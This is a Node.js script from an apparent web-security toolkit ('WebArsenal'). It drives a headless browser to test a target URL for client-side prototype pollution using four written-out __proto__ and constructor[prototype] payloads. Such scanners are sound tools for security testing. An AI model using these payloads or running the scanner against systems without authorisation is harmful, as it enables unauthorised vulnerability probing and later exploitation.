#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: prototype-pollution-finder.js                       ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const puppeteer = require('puppeteer');

program
  .name('prototype-pollution-finder.js')
  .description('Tests for Prototype Pollution vulnerabilities by attempting to pollute the global Object.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL to test')
  .parse(process.argv);

const opts = program.opts();

const POLLUTION_PAYLOADS = [
  "?__proto__[polluted]=true",
  "?constructor[prototype][polluted]=true",
  "#__proto__[polluted]=true",
  "?__proto__.polluted=true"
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'prototype-pollution-finder.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const browser = await puppeteer.launch({ headless: "new" });
  
  for (const payload of POLLUTION_PAYLOADS) {
    const testUrl = opts.url + payload;
    console.log(chalk.cyan(`[*] Testing Payload: ${payload}`));
    
    const page = await browser.newPage();
    try {
      await page.goto(testUrl, { waitUntil: 'load', timeout: 10000 });
      
      // Check if global object is polluted
      const isPolluted = await page.evaluate(() => {
        return ({}).polluted === true || window.polluted === true;
      });
      
      if (isPolluted) {
         console.log(chalk.bold.red(`\n[!] PROTOTYPE POLLUTION DETECTED!`));
         console.log(chalk.red(`    Payload: ${payload}`));
         console.log(chalk.red(`    URL: ${testUrl}\n`));
         break;
      }
    } catch (e) {}
    await page.close();
  }
  
  await browser.close();
  console.log(chalk.cyan('\n[*] Tests complete.'));
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
